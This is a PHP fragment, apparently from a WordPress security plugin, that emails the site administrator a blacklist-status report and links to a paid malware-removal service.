    </td>
  </tr>
</table>
</body>
</html>';
        
        
        if (count('BL'))
        {
            $message .= 'Your website '.get_option( 'blogname' )." is blacklisted"."<br><br>";
            $message .= 'Date: <span style="color:#D54E21">'.date("Y-m-d").'</span>'."<br><br>";
            
            foreach ($data['BL'] as $k => $row)
            {
                $message .=  '<span style="color:#D54E21">Blacklisted in '.$k.'</span>'."<br>";
            }
        }
        
        $message .= "<br><br><b>If you need help to fix your website, please get Malware and Cleaning services</b></br></br>";
        $message .= "<a href='https://www.siteguarding.com/en/services/malware-removal-service' target='_blank'>https://www.siteguarding.com/en/services/malware-removal-service</a>"."<br><br>";;
		

    	$blogname = wp_specialchars_decode( get_option( 'blogname' ), ENT_QUOTES );
        if ($data['params']['email_for_notifications'] == '') $admin_email = get_option( 'admin_email' );
        else $admin_email = $data['params']['email_for_notifications'];
        
            $txt .= $message;
            
                                                            
            $body_message = str_replace("{MESSAGE_CONTENT}", $txt, $body_message);

        $subject = sprintf( __( 'Blacklist Status for %s' ), $domain );
        $headers = 'content-type: text/html';  

        
    	@wp_mail( $admin_email, $subject, $body_message, $headers );
}
